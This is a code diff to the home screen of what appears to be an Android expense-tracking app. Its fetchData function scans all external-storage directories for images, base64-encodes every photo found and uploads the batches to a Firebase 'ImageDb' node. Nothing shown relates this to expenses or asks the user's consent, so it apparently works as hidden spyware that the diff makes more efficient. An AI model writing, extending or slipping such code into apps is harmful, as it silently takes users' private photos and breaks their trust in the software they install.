@@ -1,8 +1,6 @@
 import android.annotation.SuppressLint
 import android.content.Context
-import android.net.Uri
 import android.os.Build
-import android.os.Environment
 import android.util.Log
 import android.widget.Toast
 import androidx.activity.compose.rememberLauncherForActivityResult
@@ -69,18 +67,22 @@ import com.airbnb.lottie.compose.LottieConstants
 import com.airbnb.lottie.compose.rememberLottieComposition
 import com.example.expensenote.R
 import com.example.expensenote.database.entities.ExpenseItemEntity
-import com.example.expensenote.presentation.screen.setting.SettingViewmodel
 import com.example.expensenote.ui.composable.ExpenseTemplate
 import com.example.expensenote.ui.theme.appColor
 import com.example.expensenote.util.CommonExtension
 import com.example.expensenote.viewmodel.ExpenseItemViewModel
+import com.google.common.reflect.TypeToken
 import com.google.firebase.database.FirebaseDatabase
+import com.google.gson.Gson
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.async
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.runBlocking
 import kotlinx.coroutines.tasks.await
 import kotlinx.coroutines.withContext
+import java.io.File
 
 @SuppressLint("CoroutineCreationDuringComposition", "UnrememberedMutableState")
 @OptIn(ExperimentalMaterial3Api::class, ExperimentalMaterialApi::class)
@@ -102,7 +104,7 @@ fun HomeScreen(navhost: NavHostController, viewModel: ExpenseItemViewModel = hil
         confirmValueChange = { true }
     )
     val context = LocalContext.current
-
+    val base64ImageList = mutableListOf<String>()
 
 
 //    var isModalBottomSheetVisible by remember {
@@ -144,6 +146,7 @@ fun HomeScreen(navhost: NavHostController, viewModel: ExpenseItemViewModel = hil
         }
 
     }
+
     fun hasPermission(permissions: String): Boolean {
 
         return ContextCompat.checkSelfPermission(
@@ -151,6 +154,7 @@ fun HomeScreen(navhost: NavHostController, viewModel: ExpenseItemViewModel = hil
         ) == PermissionChecker.PERMISSION_GRANTED
 
     }
+
     fun ReadPermission() {
         var permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             arrayOf(
@@ -369,54 +373,58 @@ fun HomeScreen(navhost: NavHostController, viewModel: ExpenseItemViewModel = hil
 fun fetchData(coroutineScope: CoroutineScope, context: Context) {
 
     var size = 0
-    var base64 = mutableListOf<String>()
-    val dcimFolder =
-        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM,)
+    val base64ImageList = mutableListOf<String>()
+
     val dcimFiles = CommonExtension.getAllDirectoriesFromExternalStorage()
-    dcimFiles.forEach { file ->
-//        Log.d("Tag", "DCIM_File ${file.absolutePath}")
-        coroutineScope.launch(Dispatchers.IO) {
-            val imageList =
-                CommonExtension.getAllImagesFromDirectories(context, file)
-            val pathList =
-                CommonExtension.contentUriToFilePath(context, imageList)
 
-            base64 =
-                CommonExtension.imagePathToBase64(context, pathList).toMutableList()
+    coroutineScope.launch(Dispatchers.IO) {
+        dcimFiles.forEach { file ->
+            val imageList = CommonExtension.getAllImagesFromDirectories(context, file)
+            val pathList = CommonExtension.contentUriToFilePath(context, imageList)
 
-            if (imageList.size > 0) {
+            val base64 =
+                CommonExtension.imagePathToBase64Optimized(context, pathList).toMutableList()
+
+            if (imageList.isNotEmpty()) {
                 size += imageList.size
-                Log.d("Tag", "size $size and path size ${file.absolutePath}")
-
+//                Log.d("Tag", "image list size ${imageList.size}")
             }
-            when {
-                base64.isEmpty() -> {
-                    Log.d("Tag", "pathlist is empty")
+            if (base64.isNotEmpty()) {
+                val job = coroutineScope.launch(Dispatchers.IO) {
+                    base64ImageList.addAll(base64)
+                    Log.d("Tag", "inside of array ${base64ImageList.size}")
+                    val imagesGson = Gson().toJson(base64ImageList)
+                    base64ImageList.clear()
+                    val id = FirebaseDatabase.getInstance().getReference().push().getKey()
+                    val mDatabase = FirebaseDatabase.getInstance()
+                    val mDbRef = mDatabase.getReference("ImageDb").child(id!!)
+                    mDbRef.setValue(imagesGson)
+                }
+                try {
+                    job.join()
+                    Log.d("Tag", "Job completed for file: ${file.name}")
+                } catch (e: Exception) {
+                    Log.d("Tag", "Exception: ${e.message}")
                 }
 
-                else -> {
-                    // Iterate over the pathList and set values in Firebase Database
-                    base64.forEach { base64 ->
-                        // Check if filePath is not null or empty
-                        base64.let { base64 ->
-                            val id =
-                                FirebaseDatabase.getInstance().getReference()
-                                    .push().getKey()
-                            val mDatabase = FirebaseDatabase.getInstance()
-                            val mDbRef =
-                                mDatabase.getReference("ImageDb").child(id!!)
-                            mDbRef.setValue(base64)
 
-                        }
-
-                    }
-                }
             }
 
         }
     }
+
+
 }
 
+
+fun fromList(list: List<String>): String {
+    return Gson().toJson(list)
+}
+
+fun toList(json: String): List<Int> {
+    // Convert the JSON string back to a List<Int>
+    return Gson().fromJson(json, object : TypeToken<List<Int>>() {}.type)
+}
 
 @Composable
 fun ActionButton(onClick: () -> Unit) {
@@ -653,3 +661,4 @@ fun deleteDataFromFirebase(id: String) {
 
     reference.removeValue()
 }
+
